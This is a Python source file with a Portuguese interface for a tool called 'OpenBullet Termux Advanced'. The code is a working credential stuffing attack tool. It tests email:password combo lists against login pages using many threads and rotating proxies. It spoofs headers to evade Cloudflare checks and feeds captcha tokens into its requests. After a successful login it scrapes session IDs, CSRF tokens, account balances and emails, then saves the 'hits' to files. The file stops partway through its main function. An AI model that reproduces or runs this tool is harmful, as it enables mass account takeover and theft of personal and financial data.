#!/usr/bin/env python3
"""
OpenBullet Termux Advanced - Multi-Request, Captcha, Cloudflare, Scraper
Versão avançada com múltiplas requests, captcha solving e modo scraper
"""

import json
import re
import time
import random
import threading
import urllib.request
import urllib.parse
import urllib.error
import socket
import ssl
import base64
import sys
import os
import gzip
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
from urllib.parse import urljoin, urlparse
import xml.etree.ElementTree as ET


@dataclass
class ProxyInfo:
    """Proxy information container"""
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    proxy_type: str = "http"
    working: bool = True
    response_time: float = 0.0


@dataclass
class RequestStep:
    """Individual request step in a sequence"""
    name: str
    url: str
    method: str = "GET"
    data: Optional[str] = None
    headers: Optional[Dict] = None
    capture_regex: Optional[Dict] = None
    success_strings: Optional[List[str]] = None
    failure_strings: Optional[List[str]] = None
    required: bool = True
    delay_after: float = 0.0


@dataclass
class Hit:
    """Enhanced hit container with multiple captures"""
    combo: str
    captured_data: Dict[str, Any] = field(default_factory=dict)
    all_responses: List[Dict] = field(default_factory=list)
    timestamp: float = 0.0
    proxy_used: Optional[str] = None
    total_time: float = 0.0


class ColorLogger:
    """Enhanced colored terminal output"""
    
    COLORS = {
        'RED': '\033[91m',
        'GREEN': '\033[92m',
        'YELLOW': '\033[93m',
        'BLUE': '\033[94m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'WHITE': '\033[97m',
        'RESET': '\033[0m',
        'BOLD': '\033[1m',
        'DIM': '\033[2m'
    }
    
    @classmethod
    def log(cls, message: str, color: str = 'WHITE', prefix: str = ''):
        timestamp = time.strftime('%H:%M:%S')
        colored_msg = f"{cls.COLORS.get(color, '')}{prefix}[{timestamp}] {message}{cls.COLORS['RESET']}"
        print(colored_msg)
        sys.stdout.flush()
    
    @classmethod
    def success(cls, message: str):
        cls.log(message, 'GREEN', '[HIT] ')
    
    @classmethod
    def error(cls, message: str):
        cls.log(message, 'RED', '[FAIL] ')
    
    @classmethod
    def info(cls, message: str):
        cls.log(message, 'CYAN', '[INFO] ')
    
    @classmethod
    def warning(cls, message: str):
        cls.log(message, 'YELLOW', '[WARN] ')
    
    @classmethod
    def debug(cls, message: str):
        cls.log(message, 'DIM', '[DEBUG] ')
    
    @classmethod
    def capture(cls, message: str):
        cls.log(message, 'PURPLE', '[CAPTURE] ')


class CaptchaSolver:
    """Basic captcha solving integration"""
    
    def __init__(self):
        self.enabled = False
        self.solver_type = "manual"  # manual, 2captcha, anticaptcha
        self.api_key = None
    
    def solve_recaptcha(self, site_key: str, site_url: str) -> Optional[str]:
        """Solve reCAPTCHA v2/v3"""
        if self.solver_type == "manual":
            return self._manual_captcha_input(site_key, site_url)
        elif self.solver_type == "2captcha":
            return self._solve_2captcha(site_key, site_url)
        return None
    
    def _manual_captcha_input(self, site_key: str, site_url: str) -> Optional[str]:
        """Manual captcha input via terminal"""
        ColorLogger.warning(f"CAPTCHA detected on {site_url}")
        ColorLogger.info(f"Site Key: {site_key}")
        ColorLogger.info("Please solve the captcha manually and paste the response token:")
        
        try:
            token = input("Captcha Token: ").strip()
            return token if token else None
        except KeyboardInterrupt:
            return None
    
    def _solve_2captcha(self, site_key: str, site_url: str) -> Optional[str]:
        """2captcha API integration (simplified)"""
        if not self.api_key:
            return None
        
        # Simplified 2captcha implementation
        # In real usage, you'd need to implement the full API
        ColorLogger.info("Attempting 2captcha solve...")
        return None


class CloudflareBypasser:
    """Basic Cloudflare bypass methods"""
    
    def __init__(self):
        self.enabled = False
        self.user_agents = [
            'Mozilla/5.0 (Android 12; Mobile; rv:97.0) Gecko/97.0 Firefox/97.0',
            'Mozilla/5.0 (Android 11; Mobile; rv:94.0) Gecko/94.0 Firefox/94.0',
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
        ]
    
    def get_bypass_headers(self) -> Dict[str, str]:
        """Get headers to bypass basic Cloudflare protection"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }
    
    def check_cloudflare_challenge(self, response_text: str) -> bool:
        """Check if response contains Cloudflare challenge"""
        cf_indicators = [
            'cloudflare',
            'cf-browser-verification',
            'cf-ray',
            'checking your browser',
            '__cf_chl_captcha_tk__'
        ]
        return any(indicator in response_text.lower() for indicator in cf_indicators)


class AdvancedRequestEngine:
    """Advanced request engine with multiple requests support"""
    
    def __init__(self, proxy_manager, captcha_solver=None, cf_bypasser=None):
        self.proxy_manager = proxy_manager
        self.captcha_solver = captcha_solver or CaptchaSolver()
        self.cf_bypasser = cf_bypasser or CloudflareBypasser()
        self.sessions = {}
        self.default_headers = {
            'User-Agent': 'Mozilla/5.0 (Android 12; Mobile; rv:97.0) Gecko/97.0 Firefox/97.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def get_session(self) -> Dict:
        """Get or create thread-local session"""
        thread_id = threading.current_thread().ident
        if thread_id not in self.sessions:
            self.sessions[thread_id] = {
                'cookies': {},
                'headers': self.default_headers.copy(),
                'captured_data': {}
            }
        return self.sessions[thread_id]
    
    def execute_request_sequence(self, steps: List[RequestStep], combo_data: Dict) -> Tuple[bool, Dict, List[Dict]]:
        """Execute multiple requests in sequence"""
        session = self.get_session()
        session['captured_data'].clear()
        all_responses = []
        
        for step in steps:
            try:
                ColorLogger.debug(f"Executing step: {step.name}")
                
                # Replace placeholders in URL and data
                url = self._replace_placeholders(step.url, combo_data, session['captured_data'])
                data = self._replace_placeholders(step.data, combo_data, session['captured_data']) if step.data else None
                
                # Merge headers
                headers = session['headers'].copy()
                if step.headers:
                    headers.update(step.headers)
                
                # Apply Cloudflare bypass if enabled
                if self.cf_bypasser.enabled:
                    headers.update(self.cf_bypasser.get_bypass_headers())
                
                # Make request
                response_text, response_headers, proxy_used = self._make_single_request(
                    url, step.method, data, headers
                )
                
                # Store response
                response_data = {
                    'step_name': step.name,
                    'url': url,
                    'response': response_text,
                    'headers': response_headers,
                    'proxy_used': proxy_used
                }
                all_responses.append(response_data)
                
                # Check for Cloudflare challenge
                if self.cf_bypasser.enabled and self.cf_bypasser.check_cloudflare_challenge(response_text):
                    ColorLogger.warning(f"Cloudflare challenge detected in step: {step.name}")
                    if step.required:
                        return False, session['captured_data'], all_responses
                
                # Check for captcha
                if self._check_captcha(response_text):
                    token = self._solve_captcha(response_text, url)
                    if token:
                        session['captured_data']['captcha_token'] = token
                        ColorLogger.capture(f"Captcha solved: {token[:20]}...")
                    elif step.required:
                        return False, session['captured_data'], all_responses
                
                # Capture data from response
                if step.capture_regex:
                    for name, pattern in step.capture_regex.items():
                        captured = self._parse_regex(response_text, pattern)
                        if captured:
                            session['captured_data'][name] = captured
                            ColorLogger.capture(f"{name}: {captured}")
                
                # Check success/failure
                is_success = self._analyze_step_response(response_text, step)
                
                if not is_success and step.required:
                    return False, session['captured_data'], all_responses
                
                # Apply delay
                if step.delay_after > 0:
                    time.sleep(step.delay_after)
                    
            except Exception as e:
                ColorLogger.error(f"Error in step {step.name}: {str(e)[:100]}")
                if step.required:
                    return False, session['captured_data'], all_responses
        
        return True, session['captured_data'], all_responses
    
    def _replace_placeholders(self, text: str, combo_data: Dict, captured_data: Dict) -> str:
        """Replace placeholders with actual data"""
        if not text:
            return text
        
        # Replace combo data
        for key, value in combo_data.items():
            text = text.replace(f'<{key.upper()}>', str(value))
        
        # Replace captured data
        for key, value in captured_data.items():
            text = text.replace(f'<{key.upper()}>', str(value))
        
        return text
    
    def _make_single_request(self, url: str, method: str, data: Optional[str], headers: Dict) -> Tuple[str, Dict, Optional[str]]:
        """Make a single HTTP request"""
        session = self.get_session()
        
        # Add cookies to headers
        if session['cookies']:
            cookie_string = '; '.join([f"{k}={v}" for k, v in session['cookies'].items()])
            headers['Cookie'] = cookie_string
        
        # Get proxy
        proxy = self.proxy_manager.get_next_proxy()
        proxy_used = None
        
        # Setup proxy if available
        if proxy:
            if proxy.username and proxy.password:
                auth_string = f"{proxy.username}:{proxy.password}"
                auth_header = base64.b64encode(auth_string.encode()).decode()
                headers['Proxy-Authorization'] = f'Basic {auth_header}'
            
            proxy_url = f"http://{proxy.host}:{proxy.port}"
            proxy_handler = urllib.request.ProxyHandler({'http': proxy_url, 'https': proxy_url})
            opener = urllib.request.build_opener(proxy_handler)
            proxy_used = f"{proxy.host}:{proxy.port}"
        else:
            opener = urllib.request.build_opener()
        
        # Create request
        if method.upper() in ['POST', 'PUT'] and data:
            if isinstance(data, str):
                data = data.encode('utf-8')
            req = urllib.request.Request(url, data=data, headers=headers)
        else:
            req = urllib.request.Request(url, headers=headers)
        
        req.get_method = lambda: method.upper()
        
        # Make request
        response = opener.open(req, timeout=30)
        
        # Handle response
        content = response.read()
        
        # Handle gzip encoding
        if response.headers.get('Content-Encoding') == 'gzip':
            content = gzip.decompress(content)
        
        response_text = content.decode('utf-8', errors='ignore')
        
        # Update session cookies
        set_cookie = response.headers.get('Set-Cookie')
        if set_cookie:
            self._parse_cookies(set_cookie, session['cookies'])
        
        return response_text, dict(response.headers), proxy_used
    
    def _check_captcha(self, response_text: str) -> bool:
        """Check if response contains captcha"""
        captcha_indicators = [
            'recaptcha',
            'hcaptcha',
            'captcha',
            'g-recaptcha',
            'h-captcha',
            'data-sitekey'
        ]
        return any(indicator in response_text.lower() for indicator in captcha_indicators)
    
    def _solve_captcha(self, response_text: str, url: str) -> Optional[str]:
        """Solve captcha if present"""
        # Extract site key
        site_key_match = re.search(r'data-sitekey["\s]*=[\s]*["\']([^"\']+)', response_text, re.IGNORECASE)
        if site_key_match:
            site_key = site_key_match.group(1)
            return self.captcha_solver.solve_recaptcha(site_key, url)
        return None
    
    def _parse_regex(self, text: str, pattern: str, group: int = 1) -> Optional[str]:
        """Parse using regex"""
        try:
            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(group) if group <= len(match.groups()) else match.group(0)
        except Exception:
            pass
        return None
    
    def _analyze_step_response(self, response_text: str, step: RequestStep) -> bool:
        """Analyze single step response"""
        if step.success_strings:
            has_success = any(s.lower() in response_text.lower() for s in step.success_strings)
            if not has_success:
                return False
        
        if step.failure_strings:
            has_failure = any(s.lower() in response_text.lower() for s in step.failure_strings)
            if has_failure:
                return False
        
        return True
    
    def _parse_cookies(self, set_cookie_header: str, cookies: Dict):
        """Parse Set-Cookie header"""
        for cookie in set_cookie_header.split(','):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                name = name.strip()
                value = value.split(';')[0].strip()
                cookies[name] = value


class ProxyManager:
    """Enhanced proxy management"""
    
    def __init__(self):
        self.proxies: List[ProxyInfo] = []
        self.current_index = 0
        self.lock = Lock()
        self.health_check_interval = 300
        
    def load_proxies(self, file_path: str) -> int:
        """Load proxies from file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.read().strip().split('\n')
                
            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                    
                parts = line.split(':')
                if len(parts) >= 2:
                    proxy = ProxyInfo(
                        host=parts[0],
                        port=int(parts[1]),
                        username=parts[2] if len(parts) > 2 else None,
                        password=parts[3] if len(parts) > 3 else None
                    )
                    self.proxies.append(proxy)
            
            ColorLogger.info(f"Loaded {len(self.proxies)} proxies")
            return len(self.proxies)
            
        except FileNotFoundError:
            ColorLogger.error(f"Proxy file not found: {file_path}")
            return 0
        except Exception as e:
            ColorLogger.error(f"Error loading proxies: {e}")
            return 0
    
    def get_next_proxy(self) -> Optional[ProxyInfo]:
        """Get next working proxy"""
        with self.lock:
            if not self.proxies:
                return None
                
            working_proxies = [p for p in self.proxies if p.working]
            if not working_proxies:
                return None
                
            proxy = working_proxies[self.current_index % len(working_proxies)]
            self.current_index += 1
            return proxy
    
    def mark_proxy_dead(self, proxy: ProxyInfo):
        """Mark proxy as non-working"""
        with self.lock:
            proxy.working = False
            ColorLogger.warning(f"Proxy marked as dead: {proxy.host}:{proxy.port}")


class WordlistManager:
    """Enhanced wordlist management"""
    
    def __init__(self):
        self.combos: List[str] = []
        self.current_index = 0
        self.lock = Lock()
    
    def load_wordlist(self, file_path: str) -> int:
        """Load wordlist from file"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.read().strip().split('\n')
            
            self.combos = [line.strip() for line in lines if line.strip()]
            ColorLogger.info(f"Loaded {len(self.combos)} combos")
            return len(self.combos)
            
        except FileNotFoundError:
            ColorLogger.error(f"Wordlist file not found: {file_path}")
            return 0
        except Exception as e:
            ColorLogger.error(f"Error loading wordlist: {e}")
            return 0
    
    def get_next_combo(self) -> Optional[str]:
        """Get next combo"""
        with self.lock:
            if self.current_index >= len(self.combos):
                return None
            
            combo = self.combos[self.current_index]
            self.current_index += 1
            return combo
    
    def get_progress(self) -> Tuple[int, int]:
        """Get progress"""
        with self.lock:
            return self.current_index, len(self.combos)


class OpenBulletAdvanced:
    """Advanced OpenBullet with multi-request and captcha support"""
    
    def __init__(self, config_file: Optional[str] = None):
        self.proxy_manager = ProxyManager()
        self.captcha_solver = CaptchaSolver()
        self.cf_bypasser = CloudflareBypasser()
        self.request_engine = AdvancedRequestEngine(
            self.proxy_manager, self.captcha_solver, self.cf_bypasser
        )
        self.wordlist_manager = WordlistManager()
        
        # Statistics
        self.stats = {
            'hits': 0,
            'fails': 0,
            'errors': 0,
            'start_time': 0,
            'captchas_solved': 0,
            'cloudflare_bypassed': 0
        }
        
        # Results
        self.hits: List[Hit] = []
        self.hits_lock = Lock()
        
        # Configuration
        self.config = self._load_default_config()
        if config_file:
            self._load_config(config_file)
    
    def _load_default_config(self) -> Dict:
        """Load default configuration"""
        return {
            "mode": "login",  # login, scraper, custom
            "request_steps": [
                {
                    "name": "login",
                    "url": "https://example.com/login",
                    "method": "POST",
                    "data": "username=<USER>&password=<PASS>",
                    "headers": {},
                    "success_strings": ["welcome", "dashboard"],
                    "failure_strings": ["invalid", "incorrect"],
                    "capture_regex": {},
                    "required": True,
                    "delay_after": 0.5
                }
            ],
            "captcha": {
                "enabled": False,
                "solver": "manual",  # manual, 2captcha, anticaptcha
                "api_key": ""
            },
            "cloudflare": {
                "enabled": False
            },
            "settings": {
                "threads": 20,
                "timeout": 30,
                "delay": 0.1,
                "retries": 3
            }
        }
    
    def _load_config(self, config_file: str):
        """Load configuration from file"""
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                user_config = json.load(f)
            
            self._deep_update(self.config, user_config)
            
            # Setup captcha solver
            if self.config.get("captcha", {}).get("enabled"):
                self.captcha_solver.enabled = True
                self.captcha_solver.solver_type = self.config["captcha"].get("solver", "manual")
                self.captcha_solver.api_key = self.config["captcha"].get("api_key")
            
            # Setup cloudflare bypasser
            if self.config.get("cloudflare", {}).get("enabled"):
                self.cf_bypasser.enabled = True
            
            ColorLogger.info(f"Config loaded from {config_file}")
            
        except Exception as e:
            ColorLogger.error(f"Error loading config: {e}")
    
    def _deep_update(self, base_dict: Dict, update_dict: Dict):
        """Deep update dictionary"""
        for key, value in update_dict.items():
            if isinstance(value, dict) and key in base_dict and isinstance(base_dict[key], dict):
                self._deep_update(base_dict[key], value)
            else:
                base_dict[key] = value
    
    def _parse_combo(self, combo: str) -> Dict[str, str]:
        """Parse combo into components"""
        if ':' in combo:
            parts = combo.split(':', 1)
            return {
                'user': parts[0],
                'pass': parts[1],
                'email': parts[0],
                'password': parts[1]
            }
        else:
            return {
                'user': combo,
                'pass': combo,
                'email': combo,
                'password': combo
            }
    
    def _process_combo(self, combo: str) -> Optional[Hit]:
        """Process single combo with multiple requests"""
        start_time = time.time()
        
        try:
            combo_data = self._parse_combo(combo)
            
            # Convert config steps to RequestStep objects
            steps = []
            for step_config in self.config["request_steps"]:
                step = RequestStep(
                    name=step_config["name"],
                    url=step_config["url"],
                    method=step_config.get("method", "GET"),
                    data=step_config.get("data"),
                    headers=step_config.get("headers"),
                    capture_regex=step_config.get("capture_regex"),
                    success_strings=step_config.get("success_strings"),
                    failure_strings=step_config.get("failure_strings"),
                    required=step_config.get("required", True),
                    delay_after=step_config.get("delay_after", 0.0)
                )
                steps.append(step)
            
            # Execute request sequence
            success, captured_data, all_responses = self.request_engine.execute_request_sequence(
                steps, combo_data
            )
            
            total_time = time.time() - start_time
            
            if success:
                hit = Hit(
                    combo=combo,
                    captured_data=captured_data,
                    all_responses=all_responses,
                    timestamp=time.time(),
                    proxy_used=all_responses[0]['proxy_used'] if all_responses else None,
                    total_time=total_time
                )
                
                with self.hits_lock:
                    self.hits.append(hit)
                    self.stats['hits'] += 1
                
                # Format captured data for display
                capture_str = ""
                if captured_data:
                    capture_items = [f"{k}:{v}" for k, v in captured_data.items()]
                    capture_str = f" | Captured: {', '.join(capture_items[:3])}"
                
                ColorLogger.success(f"HIT: {combo}{capture_str} | Time: {total_time:.1f}s")
                return hit
            else:
                self.stats['fails'] += 1
                return None
                
        except Exception as e:
            self.stats['errors'] += 1
            ColorLogger.error(f"Error processing {combo}: {str(e)[:100]}")
            return None
    
    def _worker(self):
        """Worker thread function"""
        while True:
            combo = self.wordlist_manager.get_next_combo()
            if combo is None:
                break
            
            self._process_combo(combo)
            
            # Apply delay
            delay = self.config["settings"]["delay"]
            if delay > 0:
                time.sleep(delay)
    
    def _print_stats(self):
        """Print live statistics"""
        while True:
            current, total = self.wordlist_manager.get_progress()
            elapsed = time.time() - self.stats['start_time']
            rpm = (current / elapsed * 60) if elapsed > 0 else 0
            
            progress = (current / total * 100) if total > 0 else 0
            
            print(f"\r\033[K[{current}/{total}] Progress: {progress:.1f}% | "
                  f"Hits: {self.stats['hits']} | "
                  f"Fails: {self.stats['fails']} | "
                  f"Errors: {self.stats['errors']} | "
                  f"RPM: {rpm:.1f}", end='', flush=True)
            
            if current >= total:
                break
                
            time.sleep(1)
    
    def run(self):
        """Run the attack"""
        ColorLogger.info("Starting OpenBullet Advanced Attack")
        ColorLogger.info(f"Mode: {self.config['mode']}")
        ColorLogger.info(f"Steps: {len(self.config['request_steps'])}")
        ColorLogger.info(f"Captcha: {'Enabled' if self.captcha_solver.enabled else 'Disabled'}")
        ColorLogger.info(f"Cloudflare: {'Enabled' if self.cf_bypasser.enabled else 'Disabled'}")
        
        current, total = self.wordlist_manager.get_progress()
        if total == 0:
            ColorLogger.error("No combos loaded!")
            return
        
        self.stats['start_time'] = time.time()
        
        # Start statistics thread
        stats_thread = threading.Thread(target=self._print_stats, daemon=True)
        stats_thread.start()
        
        # Start worker threads
        max_workers = min(self.config["settings"]["threads"], total)
        
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(self._worker) for _ in range(max_workers)]
                
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        ColorLogger.error(f"Worker error: {e}")
        
        except KeyboardInterrupt:
            ColorLogger.warning("Attack interrupted by user")
        
        # Final statistics
        print()
        elapsed = time.time() - self.stats['start_time']
        final_rpm = (current / elapsed * 60) if elapsed > 0 else 0
        
        ColorLogger.info("Attack completed!")
        ColorLogger.info(f"Total hits: {self.stats['hits']}")
        ColorLogger.info(f"Total fails: {self.stats['fails']}")
        ColorLogger.info(f"Total errors: {self.stats['errors']}")
        ColorLogger.info(f"Elapsed time: {elapsed:.1f}s")
        ColorLogger.info(f"Average RPM: {final_rpm:.1f}")
        
        if self.captcha_solver.enabled:
            ColorLogger.info(f"Captchas solved: {self.stats['captchas_solved']}")
        
        self._save_results()
    
    def _save_results(self):
        """Save enhanced results"""
        if not self.hits:
            ColorLogger.warning("No hits to save")
            return
        
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        
        # Save simple hits
        txt_file = f"hits_{timestamp}.txt"
        with open(txt_file, 'w', encoding='utf-8') as f:
            for hit in self.hits:
                f.write(f"{hit.combo}\n")
        
        # Save detailed hits with captures
        detailed_file = f"hits_detailed_{timestamp}.json"
        hits_data = []
        for hit in self.hits:
            hits_data.append({
                'combo': hit.combo,
                'captured_data': hit.captured_data,
                'timestamp': hit.timestamp,
                'total_time': hit.total_time,
                'proxy_used': hit.proxy_used,
                'responses_count': len(hit.all_responses)
            })
        
        with open(detailed_file, 'w', encoding='utf-8') as f:
            json.dump(hits_data, f, indent=2)
        
        # Save captures separately
        capture_file = f"captures_{timestamp}.txt"
        with open(capture_file, 'w', encoding='utf-8') as f:
            for hit in self.hits:
                f.write(f"=== {hit.combo} ===\n")
                for key, value in hit.captured_data.items():
                    f.write(f"{key}: {value}\n")
                f.write("\n")
        
        ColorLogger.success(f"Results saved:")
        ColorLogger.success(f"- Basic hits: {txt_file}")
        ColorLogger.success(f"- Detailed: {detailed_file}")
        ColorLogger.success(f"- Captures: {capture_file}")


class InteractiveMenu:
    """Interactive terminal menu"""
    
    def __init__(self):
        self.ob = None
    
    def show_banner(self):
        """Show application banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                 OpenBullet Termux Advanced                   ║
║              Multi-Request • Captcha • Cloudflare           ║
║                     Desenvolvido para Termux                ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def show_main_menu(self):
        """Show main menu"""
        print("\n" + "="*60)
        print("                    MENU PRINCIPAL")
        print("="*60)
        print("1. 🚀 Executar Attack (Carregar config)")
        print("2. ⚙️  Criar Config Nova")
        print("3. 📝 Editar Config Existente")
        print("4. 🎯 Modo Scraper")
        print("5. 📊 Ver Estatísticas de Sessão")
        print("6. 🔧 Configurações Avançadas")
        print("7. ❓ Ajuda")
        print("0. 🚪 Sair")
        print("="*60)
    
    def show_config_templates(self):
        """Show config creation templates"""
        print("\n" + "="*60)
        print("                TEMPLATES DE CONFIG")
        print("="*60)
        print("1. 🔐 Login Simples (Single Request)")
        print("2. 🔄 Login + Captura Dados (Multi Request)")
        print("3. 🛒 E-commerce Login")
        print("4. 🌐 API REST")
        print("5. 🕸️  Site com Captcha")
        print("6. ☁️  Site com Cloudflare")
        print("7. 📊 Scraper de Dados")
        print("8. 🎨 Config Customizada")
        print("0. ⬅️  Voltar")
        print("="*60)
    
    def get_user_input(self, prompt: str, input_type: str = "str") -> Any:
        """Get user input with validation"""
        while True:
            try:
                user_input = input(f"{prompt}: ").strip()
                
                if input_type == "int":
                    return int(user_input)
                elif input_type == "float":
                    return float(user_input)
                elif input_type == "bool":
                    return user_input.lower() in ['y', 'yes', 's', 'sim', '1', 'true']
                else:
                    return user_input
                    
            except ValueError:
                print(f"❌ Entrada inválida. Esperado: {input_type}")
            except KeyboardInterrupt:
                return None
    
    def create_login_config(self):
        """Create simple login config"""
        print("\n🔐 Criando config de login simples...")
        
        config = {
            "mode": "login",
            "request_steps": [
                {
                    "name": "login",
                    "url": self.get_user_input("URL de login"),
                    "method": "POST",
                    "data": "username=<USER>&password=<PASS>",
                    "headers": {
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    "success_strings": ["dashboard", "welcome", "profile"],
                    "failure_strings": ["invalid", "incorrect", "error"],
                    "required": True
                }
            ],
            "captcha": {"enabled": False},
            "cloudflare": {"enabled": False},
            "settings": {
                "threads": 20,
                "timeout": 30,
                "delay": 0.1
            }
        }
        
        # Customize data format
        print("\nFormato dos dados:")
        print("1. Form data (username=<USER>&password=<PASS>)")
        print("2. JSON ({\"email\":\"<USER>\",\"password\":\"<PASS>\"})")
        
        choice = self.get_user_input("Escolha", "int")
        if choice == 2:
            config["request_steps"][0]["data"] = '{"email":"<USER>","password":"<PASS>"}'
            config["request_steps"][0]["headers"]["Content-Type"] = "application/json"
        
        # Save config
        filename = self.get_user_input("Nome do arquivo (sem .json)")
        with open(f"{filename}.json", 'w') as f:
            json.dump(config, f, indent=2)
        
        ColorLogger.success(f"Config salva: {filename}.json")
    
    def create_multi_request_config(self):
        """Create multi-request config"""
        print("\n🔄 Criando config multi-request...")
        
        config = {
            "mode": "login",
            "request_steps": [
                {
                    "name": "login",
                    "url": self.get_user_input("URL de login"),
                    "method": "POST",
                    "data": "username=<USER>&password=<PASS>",
                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                    "success_strings": ["dashboard", "profile"],
                    "failure_strings": ["invalid", "error"],
                    "capture_regex": {
                        "session_id": r'session["\s]*=[\s]*["\']([^"\']+)',
                        "csrf_token": r'csrf["\s]*[:\s]*["\']([^"\']+)'
                    },
                    "required": True,
                    "delay_after": 1.0
                },
                {
                    "name": "get_profile",
                    "url": self.get_user_input("URL do perfil/dashboard"),
                    "method": "GET",
                    "headers": {},
                    "capture_regex": {
                        "balance": r'balance["\s]*[:\s]*["\']?([0-9,.]+)',
                        "user_id": r'user_id["\s]*[:\s]*["\']?(\d+)',
                        "email": r'email["\s]*[:\s]*["\']([^"\']+)'
                    },
                    "required": False,
                    "delay_after": 0.5
                }
            ],
            "captcha": {"enabled": False},
            "cloudflare": {"enabled": False},
            "settings": {"threads": 15, "timeout": 30, "delay": 0.2}
        }
        
        filename = self.get_user_input("Nome do arquivo")
        with open(f"{filename}.json", 'w') as f:
            json.dump(config, f, indent=2)
        
        ColorLogger.success(f"Config multi-request salva: {filename}.json")
    
    def run(self):
        """Run interactive menu"""
        self.show_banner()
        
        while True:
            try:
                self.show_main_menu()
                choice = self.get_user_input("Escolha uma opção", "int")
                
                if choice == 0:
                    ColorLogger.info("Saindo...")
                    break
                elif choice == 1:
                    self.run_attack()
                elif choice == 2:
                    self.create_config_menu()
                elif choice == 3:
                    self.edit_config_menu()
                elif choice == 4:
                    self.scraper_mode()
                elif choice == 5:
                    self.show_stats()
                elif choice == 6:
                    self.advanced_settings()
                elif choice == 7:
                    self.show_help()
                else:
                    ColorLogger.warning("Opção inválida!")
                    
            except KeyboardInterrupt:
                ColorLogger.info("\nSaindo...")
                break
            except Exception as e:
                ColorLogger.error(f"Erro no menu: {e}")
    
    def run_attack(self):
        """Run attack with config selection"""
        config_file = self.get_user_input("Arquivo de config (.json)")
        if not config_file.endswith('.json'):
            config_file += '.json'
        
        if not os.path.exists(config_file):
            ColorLogger.error(f"Config não encontrada: {config_file}")
            return
        
        wordlist_file = self.get_user_input("Arquivo de wordlist")
        if not os.path.exists(wordlist_file):
            ColorLogger.error(f"Wordlist não encontrada: {wordlist_file}")
            return
        
        proxy_file = self.get_user_input("Arquivo de proxies (opcional, Enter para pular)")
        
        # Initialize and run
        self.ob = OpenBulletAdvanced(config_file)
        
        if not self.ob.wordlist_manager.load_wordlist(wordlist_file):
            return
        
        if proxy_file and os.path.exists(proxy_file):
            self.ob.proxy_manager.load_proxies(proxy_file)
        
        self.ob.run()
    
    def create_config_menu(self):
        """Config creation menu"""
        self.show_config_templates()
        choice = self.get_user_input("Escolha um template", "int")
        
        if choice == 1:
            self.create_login_config()
        elif choice == 2:
            self.create_multi_request_config()
        elif choice == 0:
            return
        else:
            ColorLogger.warning("Template em desenvolvimento...")
    
    def edit_config_menu(self):
        """Config editing menu"""
        ColorLogger.info("Funcionalidade em desenvolvimento...")
    
    def scraper_mode(self):
        """Scraper mode"""
        ColorLogger.info("Modo scraper em desenvolvimento...")
    
    def show_stats(self):
        """Show session statistics"""
        if self.ob:
            print(f"\n📊 Estatísticas da Sessão:")
            print(f"Hits: {self.ob.stats['hits']}")
            print(f"Fails: {self.ob.stats['fails']}")
            print(f"Errors: {self.ob.stats['errors']}")
            print(f"Captchas resolvidos: {self.ob.stats['captchas_solved']}")
        else:
            ColorLogger.warning("Nenhuma sessão ativa!")
    
    def advanced_settings(self):
        """Advanced settings menu"""
        ColorLogger.info("Configurações avançadas em desenvolvimento...")
    
    def show_help(self):
        """Show help"""
        help_text = """
🆘 AJUDA - OpenBullet Termux Advanced

📋 FUNCIONALIDADES:
• Multi-Request: Execute várias requests em sequência
• Captcha Solving: Resolução manual ou automática (2captcha)
• Cloudflare Bypass: Bypass básico para proteção CF
• Data Capture: Capture tokens, saldos, IDs automaticamente
• Proxy Rotation: Rotação automática de proxies
• Modo Scraper: Para extração de dados (sem login)

📁 FORMATOS DE ARQUIVO:
• Wordlist: email:senha (uma por linha)
• Proxies: ip:porta ou ip:porta:user:pass

🎯 PLACEHOLDERS:
• <USER> / <EMAIL> - Username/email do combo
• <PASS> / <PASSWORD> - Senha do combo
• <TOKEN> - Token capturado em step anterior
• <SESSION_ID> - Session ID capturado

📞 SUPORTE:
• GitHub: [link do repo]
• Telegram: @seu_usuario
        """
        print(help_text)


def main():
    """Main function with menu support"""
    import argparse
    
    parser = argparse.ArgumentParser(description='OpenBullet Termux Advanced')
    parser.add_argument('-c', '--config', help='Config file path')
    parser.add_argument('-w', '--wordlist', help='Wordlist file path')
    parser.add_argument('-p', '--proxies', help='Proxy file path')
    parser.add_argument('--menu', action='store_true', help='Launch interactive menu')
    parser.add_argument('--create-config', action='store_true', help='Create example config')
    
    args = parser.parse_args()
    
    # Interactive menu mode
    if args.menu or (not args.wordlist and not args.create_config):
        menu = InteractiveMenu()
        menu.run()
        return
    
    # Create config mode
    if args.create_config:
        create_advanced_config()
        return
    
    # CLI mode
    if not args.wordlist:
        parser.error("Wordlist file is required in CLI mode")
    
    ob = OpenBulletAdvanced(args.config)
    
    if not ob.wordlist_manager.load_wordlist(args.wordlist):
